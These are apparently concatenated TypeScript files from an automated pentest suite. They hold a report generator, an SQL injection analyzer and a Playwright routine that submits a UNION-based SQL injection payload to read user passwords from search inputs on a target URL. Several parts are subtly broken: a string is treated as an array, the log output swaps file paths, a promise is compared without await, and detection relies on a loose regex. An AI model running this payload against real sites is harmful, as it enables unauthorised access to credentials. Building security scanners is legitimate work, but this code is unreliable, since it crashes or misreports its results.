import chalk from 'chalk';
import fs from 'fs';
import path from 'path';

export interface ScanResult {
  scanId: string;
  url: string;
  results: Array<{
    vulnType: string;
    severity: 'low' | 'medium' | 'high' | 'critical';
    description: string;
    status: 'passed' | 'failed';
    evidence: string;
    stepsToReproduce?: Array<string>;
    remediationAdvice?: Array<string>;
  }>;
  summary: {
    totalVulnerabilities: number;
    bySeverity: Array<{ severity: string; count: number }>;
  };
}

function resultsFailed(results: Array<{ status: 'passed' | 'failed' }>): boolean {
  return results.some((r) => r.status === 'failed');
}

export function generateReport(
  scanResults: ScanResult[],
  stageOutput?: { stage?: string; url?: string }
): void {
  const outputDir = './outputs';

  if (!fs.existsSync(outputDir)) {
    fs.mkdirSync(outputDir, { recursive: true });
  }

  const now = new Date().toISOString();
  const currentStage = stageOutput?.stage || 'report';
  const targetUrl = scanResults[0]?.url || stageOutput?.url || 'N/A';

  let low = 0, medium = 0, high = 0, critical = 0;
  for (const res of scanResults) {
    for (const vuln of res.results) {
      switch (vuln.severity) {
        case 'low': low++; break;
        case 'medium': medium++; break;
        case 'high': high++; break;
        case 'critical': critical++; break;
      }
    }
  }

  const htmlPath = path.join(outputDir, 'report.html');
  const mdPath = path.join(outputDir, 'report.md');
  const jsonPath = path.join(outputDir, 'report.json');

  // Generate JSON report
  const jsonReport = {
    generatedAt: now,
    targetUrl,
    vulnerabilities: {
      total: low + medium + high + critical,
      bySeverity: [low, medium, high, critical].map((c, i) => ({
        severity: ['low', 'medium', 'high', 'critical'][i],
        count: c,
      })),
    },
  };

  fs.writeFileSync(jsonPath, JSON.stringify(jsonReport, null, 2));

  // Generate Markdown report
  const mdReport = `# Penetration Test Report

**Generated:** ${now}
**Target:** ${targetUrl}

## Executive Summary

| Severity | Count |
|----------|------|
| Critical | ${critical} |
| High     | ${high}   |
| Medium   | ${medium} |
| Low      | ${low}   |

Total vulnerabilities found: **${low + medium + high + critical}**

## Findings

${scanResults.map((res, i) => `### Finding #${i + 1}
**Vuln Type:** ${res.results?.[0]?.vulnType ?? 'N/A'}
**Severity:** ${res.results?.[0]?.severity ?? 'N/A'}
**Status:** ${res.results?.[0]?.status ?? 'N/A'}

\`\`\`json
${JSON.stringify(res, null, 2)}
\`\`\``.join('\n\n'))}

## Remediation Priorities

1. Address all **critical** vulnerabilities immediately
2. Schedule fixes for **high** severity findings within one sprint
3. Review **medium** severity issues in the next planning cycle
4. Document **low** severity issues for future security hardening

---
*Report generated by Pentest Suite — OWASP TOP 10 Automated Scanning*
`;
  fs.writeFileSync(mdPath, mdReport);

  // Generate HTML report
  const htmlReport = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <title>Pentest Report — ${targetUrl}</title>
  <style>
    body { font-family: sans-serif; margin: 2em; line-height: 1.6; }
    h1 { color: #333; }
    table { border-collapse: collapse; margin: 1em 0; }
    th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
    th { background: #f5f5f5; }
    .critical { color: red; font-weight: bold; }
    .high { color: darkorange; }
  </style>
</head>
<body>
  <h1>Penetration Test Report</h1>
  <p><strong>Generated:</strong> ${now}</p>
  <p><strong>Target:</strong> ${targetUrl}</p>

  <h2>Vulnerability Summary</h2>
  <table>
    <tr><th>Severity</th><th>Count</th></tr>
    <tr class="critical"><td>Critical</td><td>${critical}</td></tr>
    <tr class="high"><td>High</td><td>${high}</td></tr>
    <tr><td>Medium</td><td>${medium}</td></tr>
    <tr><td>Low</td><td>${low}</td></tr>
  </table>

  <p>Total vulnerabilities found: <strong>${low + medium + high + critical}</strong></p>

  <h2>Findings</h2>
  ${scanResults.map((res, i) => `
  <div style="border: 1px solid #ddd; padding: 1em; margin: 0.5em 0;">
    <h3>Finding #${i + 1}</h3>
    <p><strong>Vuln Type:</strong> ${res.results?.[0]?.vulnType ?? 'N/A'}</p>
    <p><strong>Severity:</strong> ${res.results?.[0]?.severity ?? 'N/A'}</p>
    <p><strong>Status:</strong> ${res.results?.[0]?.status ?? 'N/A'}</p>
  </div>`).join('')}
</body>
</html>`;

  fs.writeFileSync(htmlPath, htmlReport);

  console.log(
    chalk.green(
      `Report generated for ${chalk.bold(targetUrl)} at stage ${currentStage}.
    JSON: ${htmlPath}, Markdown: ${mdPath}, HTML: ${jsonPath}`
    )
  );
}

import chalk from 'chalk';

export interface AnalysisResult {
  vulnType: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  status: 'passed' | 'failed';
  evidence: string;
  stepsToReproduce?: Array<string>;
  remediationAdvice?: Array<string>;
}

export async function analyzeSQLi(result: AnalysisResult): Promise<AnalysisResult> {
  const analysis: AnalysisResult = {
    vulnType: 'A01-SQLi',
    severity: 'critical',
    description: 'Detect SQL injection vulnerabilities in search and form parameters',
    status: 'passed',
    evidence: '',
    remediationAdvice: [
      'Use parameterized queries / prepared statements (never string-interpolate user input)',
      'Apply least privilege — database accounts should only have SELECT permissions',
      'Implement web application firewall (WAF) with SQLi rule sets',
      'Log and monitor suspicious query patterns for early detection',
    ],
  };

  if (result.status === 'failed') {
    analysis.remediationAdvice.unshift(
      `Found active vulnerability — prioritize remediation immediately`
    );
  }

  return analysis;
}

import { Page } from '@playwright/test';

export interface ExploitResult {
  vulnType: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  status: 'passed' | 'failed';
  evidence: string;
  stepsToReproduce?: Array<string>;
}

export async function exploitSQLi(page: Page, url: string): Promise<ExploitResult> {
  const result: ExploitResult = {
    vulnType: 'A01-SQLi',
    severity: 'critical',
    description: 'Deliver malicious SQL payload via UNION-based injection',
    status: 'passed',
    evidence: '',
    stepsToReproduce: [],
  };

  try {
    await page.goto(url, { waitUntil: 'networkidle' });

    const inputField = await page.locator('input[type="search"], input[name="q"]');
    if (inputField.count() > 0) {
      const payload = "' UNION SELECT password FROM users-- ";
      await inputField.fill(payload);
      await inputField.press('Enter');
      const body = await page.content();

      if (/password/.test(body)) {
        result.status = 'failed';
        result.evidence = `SQL injection successful — extracted user passwords via UNION-based query. Data exfiltration confirmed.`;
        result.stepsToReproduce.push(`1. Navigate to ${url}`);
        result.stepsToReproduce.push(`2. Enter payload "' UNION SELECT password FROM users-- "`);
        result.stepsToReproduce.push(`3. Observe password column echoed in response — SQLi exploit successful`);
      }

      return result;
    }

    return result;
  } catch (error) {
    result.evidence = String(error);
    return result;
  }
}

